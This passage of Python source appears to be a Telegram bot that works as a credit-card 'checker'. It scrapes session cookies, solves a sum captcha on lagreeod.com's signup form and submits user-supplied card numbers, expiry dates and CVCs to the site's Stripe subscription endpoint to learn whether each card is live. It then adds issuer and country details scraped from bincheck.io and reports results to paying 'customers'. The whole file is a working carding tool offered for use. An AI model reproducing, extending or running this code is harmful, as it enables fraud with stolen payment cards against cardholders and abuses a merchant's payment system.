            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        rw = requests.get('https://www.lagreeod.com/register/check_sess_numbers', cookies=cookies, headers=hd).json()
        sm = rw['broj1']
        smok = rw['broj2']
        allf = smok + sm
        print(allf)

        try:
            os.remove('strip1_coki.txt')
            os.remove('strip1_num.txt')
        except:
            pass

        with open('strip1_coki.txt', 'a') as f:
            f.write(str(cookies) + '\n')

        with open('strip1_num.txt', 'a') as t:
            t.write(f"{sm}|{allf}|{fer}|{lat}|{name}|{psw}|{email}\n")

    except Exception as e:
        print(e)
        getting_cookies_strip1()


def process_cc_strip1(message, user_type):
    try:
        
        kg=bot.reply_to(message,f'<strong>[~] Processing Your request 10 Second Please... </strong>',parse_mode="HTML")
        
        time.sleep(10)
        if '.st' in message.text:
            P = message.text.split('.st')[1].strip()
        elif '/st' in message.text:
            P = message.text.split('/st')[1].strip()

        n, mm, yy, cvc = map(str.strip, P.split("|"))
        if yy.startswith('20'):
            yy = yy.split('20')[1]       

        try:
            with open("strip1_num.txt", "r") as f:
                for line in f:
                    sm = line.strip().split('|')[0]
                    allf = line.strip().split('|')[1]
                    fer = line.strip().split('|')[2]
                    lat = line.strip().split('|')[3]
                    name = line.strip().split('|')[4]
                    psw = line.strip().split('|')[5]
                    email = line.strip().split('|')[6]

            with open("strip1_coki.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())

        except:
            getting_cookies_strip1()
            with open("strip1_num.txt", "r") as f:
                for line in f:
                    sm = line.strip().split('|')[0]
                    allf = line.strip().split('|')[1]
                    fer = line.strip().split('|')[2]
                    lat = line.strip().split('|')[3]
                    name = line.strip().split('|')[4]
                    psw = line.strip().split('|')[5]
                    email = line.strip().split('|')[6]

            with open("strip1_coki.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
                    
        start_time = time.time()
        headers = {
            'authority': 'www.lagreeod.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.lagreeod.com',
            'referer': 'https://www.lagreeod.com/subscribe',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'stripe_customer': '',
            'subscription_type': 'Annual Subscription',
            'firstname': fer,
            'lastname': lat,
            'email': email,
            'password': psw,
            'card[name]': name,
            'card[number]': n,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvc,
            'coupon': '',
            's1': sm,
            'sum': allf,
        }

        res = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
        if 'Wrong result. Please sum these two numbers correctly.' in res.text or 'That email has already been taken. Please choose another.' in res.text or 'firstname' in res.text:
            msg = "Something Wrong Please Return Your Card Again"
            getting_cookies_strip1()
        else:        	
            try:
                gg = res.json().get('message', "")
            except:
                gg = ""
            try:
                code = res.json().get('code', "")
            except:
                code = ""
            try:
                Aldo = res.json().get('type', "")
            except:
                Aldo = ""

            try:
                meet_headers = {
                    'Referer': 'https://bincheck.io/ar',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                }
                response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
                soup = BeautifulSoup(response.text, 'html.parser')
                table1 = soup.find('table', class_='w-full table-auto')
                rows1 = table1.find_all('tr')
                table2 = soup.find_all('table', class_='w-full table-auto')[1]
                rows2 = table2.find_all('tr')

                bin_, brand, card_type, card_level, bank, bank_phone = "", "", "", "", "", ""
                for row in rows1:
                    cells = row.find_all('td')
                    if len(cells) == 2:
                        cell1_text = cells[0].text.strip()
                        cell2_text = cells[1].text.strip()
                        if cell1_text == 'BIN/IIN':
                            bin_ = cell2_text
                        elif cell1_text == 'العلامة التجارية للبطاقة':
                            brand = cell2_text
                        elif cell1_text == 'نوع البطاقة':
                            card_type = cell2_text
                        elif cell1_text == 'تصنيف البطاقة':
                            card_level = cell2_text
                        elif cell1_text == 'اسم المصدر / البنك':
                            bank = cell2_text
                        elif cell1_text == 'المُصدِر / هاتف البنك':
                            bank_phone = cell2_text

                country_name, country_iso_a2, country_iso_a3, country_flag, currency = "", "", "", "", ""
                for row in rows2:
                    cells = row.find_all('td')
                    if len(cells) == 2:
                        cell1_text = cells[0].text.strip()
                        cell2_text = cells[1].text.strip()
                        if cell1_text == 'اسم الدولة ISO':
                            country_name = cell2_text
                        elif cell1_text == 'رمز البلد ISO A2':
                            country_iso_a2 = cell2_text
                        elif cell1_text == 'ISO كود الدولة A3':
                            country_iso_a3 = cell2_text
                        elif cell1_text == 'علم الدولة':
                            country_flag = cells[1].find('img')['src']
                        elif cell1_text == 'عملة البلد ISO':
                            currency = cell2_text

                try:
                    country = pycountry.countries.get(name=country_name)
                    flag = country.flag if country else ""
                except:
                    flag = ""
                end_time = time.time()
                duration = int(end_time - start_time)

                msg = f"""
𝐒𝐭𝐫𝐢𝐩 𝐀𝐮𝐭𝐡𝟏 ⇾ 💱
𝐂𝐚𝐫𝐝 ⇾ {P}             
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {gg}
𝐌𝐚𝐬𝐬𝐚𝐠𝐞 ⇾ {code} - {Aldo}
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]} 
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫: {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @PP9PPP9
"""
                bot.delete_message(message.chat.id, kg.message_id)
                bot.reply_to(message, msg)
            except:
                bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")
    except:
        bot.reply_to(message, f"𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")

def process_bin(message, user_type):
    try:
        kg=bot.reply_to(message,f'<strong>[~] Processing Your request... </strong>',parse_mode="HTML")
        time.sleep(1)
        if '.bin' in message.text:
            P = message.text.split('.bin')[1].strip()
        elif '/bin' in message.text:
            P = message.text.split('/bin')[1].strip()

        start_time = time.time()

        meet_headers = {
            'Referer': 'https://bincheck.io/ar',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        response = requests.get(f'https://bincheck.io/ar/details/{P[:6]}', headers=meet_headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        table1 = soup.find('table', class_='w-full table-auto')
        rows1 = table1.find_all('tr')

        table2 = soup.find_all('table', class_='w-full table-auto')[1]
        rows2 = table2.find_all('tr')

        for row in rows1:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'BIN/IIN':
                    bin_ = cell2_text
                elif cell1_text == 'العلامة التجارية للبطاقة':
                    brand = cell2_text
                elif cell1_text == 'نوع البطاقة':
                    card_type = cell2_text
                elif cell1_text == 'تصنيف البطاقة':
                    card_level = cell2_text
                elif cell1_text == 'اسم المصدر / البنك':
                    bank = cell2_text
                elif cell1_text == 'المُصدِر / هاتف البنك':
                    bank_phone = cell2_text

        for row in rows2:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'اسم الدولة ISO':
                    country_name = cells[1].text.strip()
                elif cell1_text == 'رمز البلد ISO A2':
                    country_iso_a2 = cell2_text
                elif cell1_text == 'ISO كود الدولة A3':
                    country_iso_a3 = cell2_text
                elif cell1_text == 'علم الدولة':
                    country_flag = cells[1].find('img')['src']
                elif cell1_text == 'عملة البلد ISO':
                    currency = cell2_text

        try:
            country = pycountry.countries.get(name=country_name)
            flag = country.flag if country else ""
        except:
            flag = ""

        end_time = time.time()
        duration = int(end_time - start_time)

        msg = f"""
𝐁𝐈𝐍 𝐋𝐎𝐎𝐊 𝐔𝐏 🔎    
━━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {P[:6]} 
- 𝗜𝗻𝗳𝗼 ⇾ {card_type} - {brand} - {card_level}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country_name} {flag}
- 𝐏𝐇𝐎𝐍𝐄 ⇾ {bank_phone}
- 𝐎𝐓𝐇𝐄𝐑 ⇾ {currency} - {country_iso_a2} - {country_iso_a3}
- 𝐓𝐢𝐦𝐞⇾ {duration}s
- 𝐂𝐮𝐬𝐭𝐨𝐦𝐞𝐫 ⇾ {user_type}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @PP9PPP9
"""
        bot.delete_message(message.chat.id, kg.message_id)
        bot.reply_to(message, msg)
    except:
        bot.reply_to(message, f"𝙐𝙣𝙡𝙤𝙤𝙠 𝘽𝙄𝙉 𝙏𝙧𝙮 𝙖𝙣𝙤𝙩𝙝𝙚𝙧🔎")

while True:
    try:
        bot.infinity_polling()
    except Exception as e:
        print(e)
        pass
